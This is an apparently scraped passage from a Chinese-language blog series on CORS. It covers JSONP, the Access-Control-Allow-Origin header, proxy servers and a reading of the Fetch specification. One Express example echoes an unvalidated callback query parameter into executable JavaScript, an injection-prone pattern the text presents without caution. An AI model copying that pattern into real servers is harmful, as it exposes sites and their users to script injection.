http://localhost:3000/users/1，response 就會是：var data = &#123;&quot;name&quot;:&quot;user1&quot;&#125;。 接著呢，我們的前端可以這樣寫： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script src=\"http://localhost:3000/users/1\">&lt;/script> &lt;script> console.log(data) &lt;/script> &lt;/head> &lt;body> &lt;/body> &lt;/html> 就只是引入這個 script 然後把 data 印出來，就可以發現我們順利拿到資料了！所以這個方法的重點在於 server 端動態產生資料，然後以 JS 的形式輸出。 不過在實務上，我們其實事先不會知道要拿誰的資料，而是使用者做出一些動作之後，我們才去拿相對應 id 的資料，因此這個 script 就會是動態新增的，像是這樣： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function getUser(userId) &#123; // 新增 script 元素 const script = document.createElement('script') // 加上 src script.src = 'http://localhost:3000/users/' + userId // 插入到 body 中 document.body.appendChild(script); // 印出資料 console.log(data) &#125; &lt;/script> &lt;/head> &lt;body> &lt;button onclick=\"getUser(1)\">user1&lt;/button> &lt;button onclick=\"getUser(2)\">user2&lt;/button> &lt;/body> &lt;/html> 前端放了兩顆按鈕，按第一顆就去抓 user1 的資料，第二顆就去抓 user2。按了之後我們動態產生 script 然後放到 body 上，這樣等腳本載入完成，就能拿到資料了！ 不過如果你執行上面這段程式碼，會回給你一個 Uncaught ReferenceError: data is not defined 的錯誤，這是因為載入 script 是需要時間的，而我們在還沒載入完成前，就拿不到資料。 像是這種非同步的東西，解法都是一樣的，就是加上一個 callback。與其用變數來儲存資料，不如用 callback 的方式把資料帶過來。後端可以改成這樣： app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; res.end(`setData($&#123;JSON.stringify(users[userId])&#125;)`); &#125;); 你拿到的 response 就會長得像這樣： setData(&#123;\"name\":\"user1\"&#125;) 其實就是把之前的變數宣告換成傳入 function 而已。而這個 setData 就是你要寫在前端來接收資料的 function： &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;meta charset=\"utf-8\"> &lt;script> function setData(data) &#123; console.log(data) &#125; function getUser(userId) &#123; const script = document.createElement('script') script.src = 'http://localhost:3000/users/' + userId document.body.appendChild(script); &#125; &lt;/script> &lt;/head> &lt;body> &lt;button onclick=\"getUser(1)\">user1&lt;/button> &lt;button onclick=\"getUser(2)\">user2&lt;/button> &lt;/body> &lt;/html> 如此一來，當 script 載入完成以後，就會呼叫 setData 這個 function 並且把資料帶進去，我們就可以拿到資料了。 最後我們要做一個小改善，那就是不把 function 名稱寫死，而是可以讓 client 自己傳想要的名稱進來： app.get('/users/:userId', function (req, res) &#123; const userId = req.params.userId; const callback = req.query.callback; res.end(`$&#123;callback&#125;($&#123;JSON.stringify(users[userId])&#125;)`); &#125;); 而前端就可以自己帶上一個 query string，指定 callback function 的名稱： function setUser(data) &#123; console.log(data) &#125; function getUser(userId) &#123; const script = document.createElement('script') script.src = 'http://localhost:3000/users/' + userId + '?callback=setUser'; document.body.appendChild(script); &#125; 總結一下這個方法，這個方法利用 script 標籤不會擋跨來源請求的特性，讓 server 動態產生檔案的內容，並且利用呼叫 JS 函式的方式傳遞 JSON 格式的資料。 這個方法就是大名鼎鼎的 JSONP，JSON with Padding（padding 是填充的意思，可以想成就是前面填的那個 function 名稱）。 這個方法在早期 CORS 的規範還不完全時挺常用的，巧妙地跨過了瀏覽器的安全性限制。不過它的缺點是因為你只能用 script 的方式去呼叫，所以只能用 GET 這個 method，其他 POST、PATCH、DELETE 什麼的都不能用。 以前在使用 jQuery 提供的 $.ajax 的時候，就知道裡面有一個 JSONP 的參數可以調整，害我一直以為他們是同樣的東西，但其實只是 jQuery 把他們包起來而已。 JSONP 的原理是透過 script 標籤傳遞資料跨過限制，而一般我們使用的 AJAX 都是用 XMLHttpRequest 或是 fetch，這兩種方法的原理相去甚遠，完全不一樣。 最後做個總結，JSONP 是一種用 script 標籤傳遞資料藉此避開 CORS policy 的方法，必須要透過 server 配合才能使用（因為它回傳的東西其實是一段 JavaScript，而不是只有資料），目前有些網站的 API 還有支援 JSONP，例如說 Twitch API。 中場休息講到這邊，前端可以嘗試的解法應該就差不多了，而你也會發現，上面提到的這三個解法： 關掉瀏覽器的安全性設置 把 fetch mode 設成 no-cors 不要用 AJAX 拿資料 都沒有辦法真正解決問題。 第一種只對自己瀏覽器有效，第二種只是自欺欺人，還是拿不到 response，第三種需要 server 特別支援而且有其限制。 這就是為什麼我在上一篇裡面說了：「大部分情形下，CORS 都不是前端的問題，純前端是解決不了的」。瀏覽器因為安全性的考量所以會把東西給擋住，因此，你必須要讓瀏覽器知道：「這其實是安全的」，它才會放行。 舉個例子，你發了一個跨來源的請求給 google.com，瀏覽器因為之前講的安全性問題擋住了。是誰可以決定不要把這個請求給擋住？不會是前端，因為前端是發出請求的那一方。所以，答案就理所當然是後端了，也就是 google.com，只要 google.com 跟瀏覽器說：「欸欸我相信這個 origin，他不會做壞事，把我的 response 給他吧！」，瀏覽器就會照做。 就像是如果你去餐廳打工，聽到客人說：「我認識老闆喔」，你會立刻就相信他嗎？不會，因為每個人都可以說他認識老闆，但你沒辦法判斷是不是真的。要判斷真偽，你只能去問老闆，如果老闆說：「對，我真的認識」，那就是真的認識。 所以擁有決定權的並不是客人，而是老闆。送出跨來源請求也是這樣，每個 origin 一定都會說自己有權限，但問那些發出請求的人不準，而是要問接收到請求的那一邊，問說你是不是願意給這個 origin 權限，如果願意的話才放行。 那要怎麼跟瀏覽器說：「我願意」呢？方法可能比你想像中簡單很多，加一個 header 就行了！ 真正的解法：請後端設置 CORS header還記得一開始用 fetch 時出現的那個錯誤嗎？ Access to fetch at ‘http://localhost:3000/‘ from origin ‘http://localhost:8081‘ has been blocked by CORS policy: No ‘Access-Control-Allow-Origin’ header is present on the requested resource. If an opaque response serves your needs, set the request’s mode to ‘no-cors’ to fetch the resource with CORS disabled. 這點是這一句：No ‘Access-Control-Allow-Origin’ header is present on the requested resource 剛剛有提到說後端才是擁有權限的那一方，可以告訴瀏覽器：「我允許這個 origin 跨來源存取我的資源」，而告訴瀏覽器的方法，就是在 response 加上一個 header。 這個 header 的名稱叫做 Access-Control-Allow-Origin，內容就是你想要放行的 origin，例如說：Access-Control-Allow-Origin: http://localhost:8081，這樣就是允許 http://localhost:8081 的跨來源請求。 那如果想要允許多個來源呢？抱歉，你沒辦法在 header 內放入多個 origin，你只能放一個，或是你可以選擇放 *，就代表允許任何 origin 的意思。如果想要針對多個 origin，server 那邊必須做一點額外處理。 這邊我們先來看放 * 的情形： var express = require('express'); var app = express(); app.get('/', function (req, res) &#123; res.set('Access-Control-Allow-Origin', '*'); res.end('hello world'); &#125;); app.listen(3000, function () &#123; console.log('Example app listening on port 3000!'); &#125;); 這樣就是在跟瀏覽器說：「任何 origin 都可以拿到我的 response，你不需要擋下來」。所以當前端用 AJAX 去送 request 的時候，就可以拿到 response，不會出現任何錯誤。 這邊有一個常見的錯誤，就是有些人以為 Access-Control-Allow-Origin 這個 header 是前端在發送 request 時要加的。不，這完全是錯的，前端加這個完全沒有用，因為這個 header 只存在 response 裡面，是後端才需要加的，前端加了跟沒加一樣。 所以如果你在前端有加這個，麻煩把它拿掉。再次強調，CORS 問題不是純前端可以解決的，基本上一定需要後端的介入。 如果只想針對特定的 origin 開放權限，只要傳入要開放的 origin 就行了： app.get('/', function (req, res) &#123; res.set('Access-Control-Allow-Origin', 'http://localhost:8081'); res.end('hello world'); &#125;); 就是這麼的簡單，只要加了一個 header，就可以告訴瀏覽器說：「我同意這個 origin 拿到我的 response」，就這樣就好了。 這才是從根本去解決跨來源請求的問題。如果你跟想存取的資源有合作關係的話，通常直接請他們設定這個 header 就行了。例如說你在串接公司後端的 API 時碰到 CORS 問題，這時候請去找後端工程師幫你把這個 header 加上去。 不要想著靠自己來解決，因為這不是前端該解決的問題，是後端該解決的，只是你要幫助他，告訴他應該怎麼解。 上面我有強調一件事，那就是「你跟想存取的資源有合作關係」，但有時候，你可能就是會想要在前端拿一些「跟你沒有合作關係」的資料，例如說你想呼叫別人家的非公開 API，或是去抓 google.com 的內容之類的，這些資源絕對不會給你 Access-Control-Allow-Origin 這個 header。 這時候怎麼辦呢？ 讓我們歡迎 proxy server 登場！ 使用 proxy server這幾篇文章中不斷提醒大家，同源政策什麼的都只是「瀏覽器的限制」，一旦脫離了瀏覽器，就沒有任何限制了，proxy server 就是如此。 Proxy server 的翻譯叫做代理伺服器，在不同的場合下用這個詞，代表的意思會有一點點不同，但是大方向都是一樣的。原本你是從 A 傳資料到 B，用代理以後變成你從 A \b傳到 P（proxy server），P 再傳到 B，然後再回傳回來，中間那個 P 就擔任著「代理」的角色。 這就像是藝人與經紀人一樣，對外的工作都是經紀人負責接洽，談完以後才告知藝人。而藝人如果想找誰合作，也是讓經紀人去問，問完再跟藝人說。所以經紀人其實就是藝人明星的「代理人」。 那要如何把這個概念應用在 CORS 相關的問題上面呢？ 如果你想拿 A 網站的資料，但是它沒有提供 Access-Control-Allow-Origin 這個 header，你就自己寫個 server，從後端去拿 A 網站的資料，再把資料丟回給自己的前端就行了。因為自己的後端可以自己控制，所以你想加什麼 header 就加什麼 header，想拿什麼資料就拿什麼。 圖片中的數字代表以下流程： 瀏覽器發 request 到 proxy，說要拿 huli.tw 的資料 proxy server 去跟 huli.tw 拿資料（後端，不是瀏覽器所以沒有跨來源限制） huli.tw 回傳資料給 proxy（同上，沒有跨來源限制） proxy 回傳資料給瀏覽器，並加上 CORS header（所以前端不會被擋） 大家應該都有聽過的 CORS Anywhere，開頭就直接寫了： CORS Anywhere is a NodeJS proxy which adds CORS headers to the proxied request. 就是一個 proxy server，幫你把想存取的資源加上 CORS 的 header。或是如果你有在用 Chrome 上幫你解決 CORS 問題的 plugin，背後原理其實也只是用 plugin 幫你把 response 加上 Access-Control-Allow-Origin 這個 header 而已。 所以，要解決 CORS 沒有什麼魔法，無論你是裝了 plugin 還是用了 proxy server，背後原理都是一樣的，都還是那個 Access-Control-Allow-Origin 的 header。 不過講到 proxy 這個做法，有些人可能會有個疑問： 開頭的時候不是說如果可以拿任意網站的資料會有安全性問題嗎？那 proxy server 呢？為什麼用了 proxy 就沒有這限制？ 來，我們來看這張對照圖，上面是走 proxy 的流程，下面是沒有走的： 我們先來看下半部的，如果不經過 proxy 的話就會有之前提過的安全性問題，網站可以去拿你 localhost 或是其他網站的資料，所以瀏覽器要把它擋住。 接著來看上半部，這邊有一點很重要，那就是如果走 proxy 的話，跟 localhost:3000 溝通的是誰？是 proxy server，所以網頁去抓的並不是「本機的 localhost:3000」，而是「proxy server 的 localhost:3000」，那這樣對你的電腦來說，就沒有安全性的問題（但是對 proxy server 可能有）。 總結在這一篇裡面我們看了很多種不同的解法，你最常用的應該要是「請後端加上 CORS header」這一種，因為這通常是最正確的解法。但如果你對後端沒有掌控權，例如說你就是想要抓其他不認識的來源的資料，那大概會自己架一個 proxy server 或者是找現成的，讓 proxy 幫你加上 CORS header。 現成的 server 以前有很多人會用 CORS Anywhere，但是從 2021 年 2 月開始，因為各種因素所以這個服務會被加上很多限制，因為它本來就不是給大家作為 proxy 服務來使用，而是作為 CORS anywhere 這個專案的 demo。詳情可以參考：PSA: Public demo server (cors-anywhere.herokuapp.com) will be very limited by January 2021, 31st #301 若是後端 API 只提供 JSONP 形式的方式，那也可以用 JSONP 來做；只是在自己電腦上想測試東西又覺得 CORS 很煩的話，裝個擴充套件來解決這問題也是可以的，但要注意的是這只有在自己電腦上有用，換一台電腦就失效了。 其實沒有說哪一種做法一定是對，哪一種一定是錯，畢竟不同的場合之下會有不同作法。但我之所以會說「請後端加上 CORS header 通常是最正確的解法」，是因為大部分人碰到跨來源請求問題可能都是在工作上。這時如果前後端都有經驗，加個 header 就沒事了，但如果兩方都經驗不足，可能就會繞遠路，讓前端自己去架個 proxy server，這就是對這個主題不夠熟造成的後果。 或有些人會開始研究怎麼樣「透過純前端來解跨來源問題」，繞了一大圈發現怎麼這也不行那也不行，連看似最有希望的 mode: no-cors 也不行。看完這篇你就懂了，因為這本來就不是前端該解的，所以你當然沒辦法透過純前端解開。 那 CORS 問題看完這篇就能夠完全解決了嗎？不一定。 這篇文章只處理到「最簡單的情況」，還有幾個狀況我們沒有講到，像是最常見的： 非簡單請求（使用其他 HTTP method 與自定義 header） 傳送 Cookie（如何讓跨來源請求也支援 cookie） 這些都會在下一篇：CORS 完全手冊（三）：CORS 詳解裡面跟大家說明。","link":"/2021/02/19/cors-guide-2/"},{"title":"CORS 完全手冊（四）：一起看規範","text":"前言當你獲得了一個知識之後，要怎樣才能知道那是正確的還是錯誤的？在程式的領域中這其實是一個相對簡單的問題，只要去確認規範是怎麼寫的就可以了（如果有規範的話）。 舉例來說，JavaScript 的各種語言特性在 ECMAScript Specification 裡面都找得到，為什麼 [] === [] 會是 false，為什麼 &#39;b&#39; + &#39;a&#39; + + &#39;a&#39; + &#39;a&#39; 會是 baNaNa，這些在規範裡面都有，都會詳細說明是用怎樣的規則在做轉換。 而 Web 相關的領域除了 JS 以外，HTML 或是其他相關的規範幾乎都可以在 w3.org 或是 whatwg.org 裡面找到，資源相當豐富。 雖然說瀏覽器的實作有可能跟規範寫的不一樣（像是這篇），但 spec 已經是最完整而且最有權威性的一個地方了，因此來這邊找準沒錯。 如果搜尋 CORS 的 spec，可能會找到 RFC6454 - The Web Origin Concept 以及 W3C 的 Cross-Origin Resource Sharing，但這兩份都叫這一份叫做 Fetch 的文件給取代了。 當初我疑惑了一陣子想說是不是自己看錯，fetch 跟 CORS 有什麼關係？後來才知道原來這邊的 fetch 跟 Web API 那個 fetch 其實不同，這份規格是定義了所有跟「抓取資料（fetch）」有關的東西，就如同它的大綱所寫的： The Fetch standard defines requests, responses, and the process that binds them: fetching. 這一篇就讓我們一起來看一下 CORS 相關的規範，證明我前面幾篇沒有在唬爛你，講得都是有所根據的。因為規格還滿長的，所以底下就是我挑幾個我認為的重點講而已，想要理解所有的規格內容，還是需要自己去看才行。 （此文章發佈時所參考的規格的版本為：Living Standard — Last Updated 15 February 2021，最新的規格請參考：Fetch） 先來點簡單的規格這種東西因為很完整所以內容很多也很雜，如果不先從簡單一點的開始很容易會看不下去。而最簡單的就是開頭的 Goals 跟 Preface 這兩個單元了，裡面寫到了： The goal is to unify fetching across the web platform and provide consistent handling of everything that involves, including: URL schemes Redirects Cross-origin semantics CSP Service workers Mixed Content Referer To do so it also supersedes the HTTP Origin header semantics originally defined in The Web Origin Concept 這份規格統整了所有「fecthing」相關的東西，例如說我們最關注的 CORS 或是其他相關的操作。然後也有提到說這份取代了原本的 RFC6454 - The Web Origin Concept。 接著在前言中有寫到： At a high level, fetching a resource is a fairly simple operation. A request goes in, a response comes out. The details of that operation are however quite involved and used to not be written down carefully and differ from one API to the next. fetch 看起來很簡單，不過就是發個 request 然後接收 response 而已，但實際上其實水很深，以前沒有規格記錄下來導致每個 API 的實作都不一樣，這也是為什麼會有這個統一的 spec 誕生。 Numerous APIs provide the ability to fetch a resource, e.g. HTML’s img and script element, CSS’ cursor and list-style-image, the navigator.sendBeacon() and self.importScripts() JavaScript APIs. The Fetch Standard provides a unified architecture for these features so they are all consistent when it comes to various aspects of fetching, such as redirects and the CORS protocol. 這邊提到了我在前面所說的，抓取資料或是跨來源抓取資源並不只侷限在 AJAX 上面，載入圖片或是 CSS 也是抓取資源的一種，而這份規格就是為了統一管理這些行為。 The Fetch Standard also defines the fetch() JavaScript API, which exposes most of the networking functionality at a fairly low level of abstraction. 身為 Fetch 規格，定義 JS 中的 fetch() API 也是相當合情合理的事情。 簡單的部分就到這邊了，這邊就只是在講說為什麼會有這份規格還有它想達成的目的是什麼。 接著我們來看一下 Origin 的定義。 OriginOrigin 的部分在 3.1. Origin header，裡面有附上 ABNF，用特定格式寫成的規則： Origin &#x3D; origin-or-null origin-or-null &#x3D; origin &#x2F; %s&quot;null&quot; ; case-sensitive origin &#x3D; scheme &quot;:&#x2F;&#x2F;&quot; host [ &quot;:&quot; port ] 簡單來說就是 origin 的內容只會有兩種，一種是 &quot;null&quot;，注意這邊我特別用引號括住，因為那是一個字串。第二種就是前面文章中提到的 scheme + host + port 的組合。 這邊值得注意的是與舊的 rfc6454 的區別，在舊的規範中 origin 其實可以是一個 list 的： 7.1. Syntax The Origin header field has the following syntax: origin &#x3D; &quot;Origin:&quot; OWS origin-list-or-null OWS origin-list-or-null &#x3D; %x6E %x75 %x6C %x6C &#x2F; origin-list origin-list &#x3D; serialized-origin *( SP serialized-origin ) serialized-origin &#x3D; scheme &quot;:&#x2F;&#x2F;&quot; host [ &quot;:&quot; port ] ; &lt;scheme&gt;, &lt;host&gt;, &lt;port&gt; from RFC 7.2 Semantics In some cases, a number of origins contribute to causing the user agents to issue an HTTP request. In those cases, the user agent MAY list all the origins in the Origin header field 不過在新的規範中看起來只會剩下一個。總之呢，origin 的定義就跟我之前講的一樣，是 scheme + host + port 的組合。 再來我們直接去看我們最想知道的 CORS！ CORSCORS 的部分在 3.2. CORS protocol 的地方。開頭的介紹非常重要。 To allow sharing responses cross-origin and allow for more versatile fetches than possible with HTML’s form element, the CORS protocol exists. It is layered on top of HTTP and allows responses to declare they can be shared with other origins. CORS protocol 存在是為了讓網頁可以有除了 form 元素以外，也可以抓取跨來源資源的方法。然後這個 procotol 是建立在 HTTP 之上的。 It needs to be an opt-in mechanism to prevent leaking data from responses behind a firewall (intranets). Additionally, for requests including credentials it needs to be opt-in to prevent leaking potentially-sensitive data. 這邊提到了「prevent leaking data from responses behind a firewall (intranets)」，其實就是我第一篇文章中所提到的案例。如果沒有 same-origin policy 的保護，在內網的資訊可能就會被輕易取得。 而「for requests including credentials it needs to be opt-in」也是我們之前所提到的，如果 request 有包含 credentials（通常是 cookie），就必須 opt-in，否則也會有資訊洩漏的風險。 接著底下 3.2.1. General 的這一段也很重要： The CORS protocol consists of a set of headers that indicates whether a response can be shared cross-origin. For requests that are more involved than what is possible with HTML’s form element, a CORS-preflight request is performed, to ensure request’s current URL supports the CORS protocol. 這邊提到了兩個重點，第一個是 CORS 是透過 header 來決定一個 response 是不是能被跨來源共享，這就是我在上一篇裡面所說的： 說穿了，CORS 就是藉由一堆的 response header 來跟瀏覽器講說哪些東西是前端有權限存取的。 第二個是如果一個 request 超過 HTML 的 form 元素可以表達的範圍，那就會有一個 CORS-preflight request。 那到底怎樣叫做「超過 form 元素可以表達的範圍」？這個我們稍後再看，先來看底下這兩個部分： 3.2.2. HTTP requests A CORS request is an HTTP request that includes an Origin header. It cannot be reliably identified as participating in the CORS protocol as the Origin header is also included for all requests whose method is neither GET nor HEAD. 這邊滿特別的，如果我沒有理解錯誤的話，是說一個 HTTP request 如果含有 origin 這個 header，就叫做 CORS request，但這並不代表這個 request 就跟 CORS procotol 有關，因為除了 GET 跟 HEAD 之外的 request 都會帶上 origin 這個 header。 為了驗證這個行為，我建立了一個簡單的表單： &lt;form action=\"/test\" method=\"POST\"> &lt;input name=\"a\" /> &lt;input type=\"submit\" /> &lt;/form> 然後 method 那邊 POST 跟 GET 都試試看，發現果真是這樣沒錯。GET 的沒有帶 origin header，但是 POST 的有。所以按照規格上的說法，用表單 POST 送出資料到同一個 origin 底下，也會被叫做 CORS request，奇怪的知識又增加了。 A CORS-preflight request is a CORS request that checks to see if the CORS protocol is understood. It uses OPTIONS as method and includes these headers: Access-Control-Request-MethodIndicates which method a future CORS request to the same resource might use. Access-Control-Request-HeadersIndicates which headers a future CORS request to the same resource might use. 而 CORS-preflight request 就是利用 OPTIONS 來確認 server 是不是理解 CORS procotol。 這邊有一點要特別提，就如同 MDN 上面寫的： 部分請求不會觸發 CORS 預檢。這類請求在本文中被稱作「簡單請求（simple requests）」，雖然 Fetch 規範（其定義了 CORS）中並不使用這個述語 在 Fetch 的規範中並沒有出現簡單請求這個詞，只有區分會不會觸發 CORS-preflight request 而已。 而 CORS protocol 當中的 preflight request 會帶這兩個 header： Access-Control-Request-Method Access-Control-Request-Headers 來說明之後的 CORS request 可能會用到的 method 跟 header，這我們在上一篇也有提過了。 接著有關 response 的部分： 3.2.3. HTTP responses An HTTP response to a CORS request can include the following headers: Access-Control-Allow-OriginIndicates whether the response can be shared, via returning the literal value of the Origin request header (which can be null) or * in a response. Access-Control-Allow-CredentialsIndicates whether the response can be shared when request’s credentials mode is “include”. 這兩個是針對 CORS request 可以返回的 response header，已經在上一篇文章裡面提到過了。前者用來決定哪些 origin 合法，後者決定是不是允許帶上 cookie 以及設置 cookie。 An HTTP response to a CORS-preflight request can include the following headers: Access-Control-Allow-MethodsIndicates which methods are supported by the response’s URL for the purposes of the CORS protocol. Access-Control-Allow-HeadersIndicates which headers are supported by the response’s URL for the purposes of the CORS protocol. Access-Control-Max-AgeIndicates the number of seconds (5 by default) the information provided by the Access-Control-Allow-Methods and Access-Control-Allow-Headers headers can be cached. CORS-preflight request 也是 CORS request 的一種，所以上面所說的針對 CORS request 可以給的 response 也都可以給。 而除此之外還定義了另外三個： Access-Control-Allow-Methods：可以使用哪些 method Access-Control-Allow-Headers：可以使用哪些 header Access-Control-Max-Age：前兩個 header 可以快取多久 這邊值得注意的是第三個，預設值是 5 秒，所以 5 秒內針對同一個資源的 CORS response header 是可以重用的。 An HTTP response to a CORS request that is not a CORS-preflight request can also include the following header: Access-Control-Expose-HeadersIndicates which headers can be exposed as part of the response by listing their names. 針對不是 preflight 的 CORS request，可以提供 Access-Control-Expose-Headers 這個 header，用來指名有哪些 header 可以存取。 如果沒有明確指定的話，就算拿到了 response 還是沒辦法拿到 header。 接著我們回來看前面提到的那個問題：「怎樣會觸發 preflight request？」 Preflight request在 4.1. Main fetch 的章節中有詳細敘述了抓取資源的規則，其中我們關注的是第 5 點中的： request’s use-CORS-preflight flag is setrequest’s unsafe-request flag is set and either request’s method is not a CORS-safelisted method or CORS-unsafe request-header names with request’s header list is not empty Set request’s response tainting to “cors”. Let corsWithPreflightResponse be the result of performing an HTTP fetch using request with the CORS-preflight flag set. If corsWithPreflightResponse is a network error, then clear cache entries using request. Return corsWithPreflightResponse. 如果 reqeust 的 method 不是 CORS-safelisted method，或是 header 裡面有 CORS-unsafe request-header names 的話，就會設置 CORS-preflight flag 然後進行 HTTP fetch。 繼續往下追的話，在 HTTP fetch 的流程裡會判斷這個 flag 有沒有被設置，有的話就進行 CORS-preflight fetch。 上面所提的東西都可以在 spec 中找到： 2.2.1 Methods A CORS-safelisted method is a method that is GET, HEAD, or POST. 只有這三個 method 不會觸發 preflight。 而有關於 CORS-unsafe request-header names，它會去檢查 headers 是不是都是「CORS-safelisted request-header」，這邊的定義在 2.2.2. Headers 的部分，基本上只有以下幾個會過： accept accept-language content-language content-type 但要注意的是 content-type 有額外附加條件，只能是： application&#x2F;x-www-form-urlencoded multipart&#x2F;form-data text&#x2F;plain 這三種。 另外，上面的 header 對應的 value 中一定都要是合法字元，至於哪些是合法字元，每個 header 的定義都不同，這邊就不細講了。 仔細想想其實會發現滿合理的，因為以 form 來說，可以填的 method 就只有 GET 跟 POST（還有一個 dialog 啦但是跟 HTTP 無關了），可以填的 enctype 也只有上面說的那三種，沒有填的話預設就是 application/x-www-form-urlencoded。 因此如果是表單的話，確實不會超過上面那樣的定義。而如果在發出 request 的時候超過了這個範圍，就會送出 preflight request。 所以想要 POST 送出 JSON 格式的資料也會觸發，除非你 content-type 用 text&#x2F;plain，就可以繞過 preflight request（但不建議這樣做就是了）。 CORS check關於 request 的部分應該都看完了，接著來看一下 response 相關的部分。有一件我很好奇的事情，那就是該怎麼驗證 CORS 的結果是過關的？ 這邊可以看到 4.10. CORS check： 如果 Access-Control-Allow-Origin 裡的 origin 是 null 的話，就失敗（這邊特地強調是 null 而不是 “null”，這我們之後會再提到）。 再來檢查如果 origin 是 * 而且 credentials mode 不是 include，就給過。 接著比對 request 的 origin 跟 header 裡的，不同的話就回傳失敗。 比對到這一步的時候 origin 相同了，接著再看一次 credentials mode，不是 inlcude 的話就給過。 反之則檢查 Access-Control-Allow-Credentials，如果是 true 的話就給過，否則就回傳失敗。 這一系列的檢查有種 early return 的味道在，可能是因為這樣比較好寫成條列式的，盡量把巢狀給壓平。 以上差不多就是跟 CORS 有關的規格了，第六章節整個都在講 fetch API，第七章節在講 websocket。 接著我們來關心一些我覺得也滿重要的一些內容。 誤導人的 no-cors mode 與 fetch 的流程前面有提過 fetch 可以設定一個 mode: no-cors，接下來我們就來看一下從規格的角度，到底實際上會做一些什麼事情。 因為這是 fetch request 的一個參數，所以要從 5.4 Request class 開始看起，裡面有一個段落是：The new Request(input, init) constructor steps are: 在第 30 步的地方可以看到： 如果 request 的 method 不是 GET、HEAD 或是 POST 的話，就丟一個 TypeError 出來。除此之外，也會把 header&#39;s guard 設成 request-no-cors。 上面這只是新建一個 request 而已，接著可以看 5.6. Fetch method 來看實際送出 request 的流程： 前面都只是在設定一些參數，真正做動作的是第十步： Fetch request with processResponse given response being these substeps 那個「Fetch」是個超連結，點下去可以連到 4. Fetching 的章節，而這邊我們關注的是最後一步： Run main fetch given fetchParams. main fetch 也是一個超連結，點了會跳到 4.1. Main fetch 去，這邊有一整段專門在處理 mode 是 no-cors 時的狀況： 這邊有幾個值得注意的地方： 第二步把 request 的 response tainting 設成 opaque 第三步去執行了「scheme fetch」 第五步新建了一個 response，只有 status 跟 CSP list 底下的 warning 這邊可以繼續往 scheme fetch 去追，就會跟剛剛一樣繼續追到各種不同的 fetch method，然後越追越深。不過這邊我已經幫大家追過了，再追下去其實沒什麼特別的，我們先假設第四步不成立好了，所以會執行到第五步：「Return a new response whose status is noCorsResponse’s status, and CSP list is noCorsResponse’s CSP list.」 而 warning 的部分其實滿重要的： This is only an effective defense against side channel attacks if noCorsResponse is kept isolated from the process that initiated the request. 這邊之所以會新建一個 response，是因為不想回傳原本的 response，要讓原本的 response 跟發起這個 request 的 process 分開。為什麼要這樣做呢？這我們下一篇會提到。 再來我們繼續往下看，可以看到第十四步： 之前已經把 response tainting 設成 opaque，所以根據第二點，會把 response 設成 opaque filtered response。 那這個 opaque filtered response 是什麼呢？ An opaque filtered response is a filtered response whose type is “opaque”, URL list is the empty list, status is 0, status message is the empty byte sequence, header list is empty, and body is null. 這就是我們之前用 mode: &#39;no-cors&#39; 所拿到的 response，status 是 0，沒有 header，也沒有 body 的 response。 從規格裡面我們證實了我前面所說的事情，一旦 mode 設成 no-cors，你就是拿不到 response，儘管後端有設定 header 也一樣。 使用 CORS 與 cache 時的注意事項在規格裡面有一個段落：CORS protocol and HTTP caches 特別在講這個。 先假設一個情境好了，那就是 server 只會對有帶 origin 的 request 回覆 Access-Control-Allow-Origin 這個 header，沒有帶 origin 的話就不會回（Amazon S3 就是這樣做的）。然後這個 response 有設定快取，所以會被瀏覽器快取起來。 然後假設我們現在要顯示一張圖片好了，這個圖片在 S3 上面，所以是跨來源的。 我們在頁面上放 &lt;img src=&quot;https://s3.xxx.com/a.png&quot;&gt;，瀏覽器載入圖片，並且把 response 快取起來。因為是用 img 標籤的關係，所以瀏覽器不會帶 origin header，因此 response 自然而然也就沒有 Access-Control-Allow-Origin。 但接下來我們在 JS 裡面也需要拿到這個圖片，因此我們用 fetch 去拿：fetch(&#39;https://s3.xxx.com/a.png&#39;)，這時候這就變成是 CORS request 了，因此 request header 會帶上 origin。 可是呢，由於我們前面已經把這個 url 的 response 快取起來了，所以瀏覽器會直接使用之前還沒過期的 cached response。 這時候悲劇就發生了，之前快取的 response 是沒有 Access-Control-Allow-Origin 這個 header 的，所以 CORS 驗證就失敗了，我們就拿不到圖片內容了。 那要怎麼解決這個狀況呢？在 HTTP response header 裡面有一個 Vary，用來決定這個 response 的快取可能會跟著某些 request header 而不同。 舉例來說，如果傳了 Vary: Origin，就代表如果我之後發的 request 裡的 origin header 不同，那就不應該沿用之前的快取。 以前面講的狀況而言，設定這個 header 以後，我們用 fetch 發的 request 因為 Origin header 跟之前用 img 的不同，所以照理來說就不會沿用之前快取好的 response，而是會重新發出一個 request。 而這個問題我本人還真的碰到過…請參考：原來 CORS 沒有我想像中的簡單。 總結在這篇裡面我們一起看了 fetch 的 spec，從規格的層面去看抓取資源這件事情，也從規格裡面證實了很多前面幾篇文章的說法。其實很推薦大家找一段空閒時間把 spec 稍微掃過一遍，至少會對很多東西有點印象，之後想找資料的時候會容易很多。 除此之外，也能看到一些規格中比較有趣的部分，例如說最後提的那個快取的問題，我還就真的碰到過。如果有早一點看規格，碰到問題時應該就能更快想到解法。 在看規格的時候也可以發現很多東西是出於安全性的考量而做的，接下來就讓我們來看看這個系列的倒數第二篇文章：CORS 完全手冊（五）：跨來源的安全性問題。","link":"/2021/02/19/cors-guide-4/"},{"title":"CORS 完全手冊（三）：CORS 詳解","text":"前言在上一篇裡面我們提到了常見的 CORS 錯誤解法，以及大多數狀況下應該要選擇的解法：「請後端加上 response header」。 但其實「跨來源請求」這個東西又可以再細分成兩種，簡單請求跟非簡單請求，簡單請求的話可以透過上一篇的解法來解，但非簡單請求的話就比較複雜一些了。 除此之外，跨來源請求預設是不會把 cookie 帶上去的，需要在使用 xhr 或是 fetch 的時候多加一個設定，而後端也需要加一個額外的 header 才行。 與 CORS 相關的 header 其實不少，有些你可能聽都沒聽過。原本這篇我想要把這些東西一一列出來講解，但仔細想了一下覺得這樣有點太無趣，而且大家應該看過就忘記了。 那怎樣的方法會比較好呢？大家都喜歡聽故事，因此這篇讓我們從故事的角度下手，為大家講述一段愛與 CORS 的故事。 主角的名字大家都知道了，對，就是毫無新意的小明。 Day1：簡單的 CORS小明任職於某科技公司，擔任菜鳥前端工程師。 而他的第一個任務，就是要做一個「聯絡我們」的表單，讓看到官網，對他們服務有興趣的潛在使用者能夠聯絡到公司的人，再讓業務去跟他們聯絡，洽談後續的合作事項。 而表單長這樣（雖然長得很像 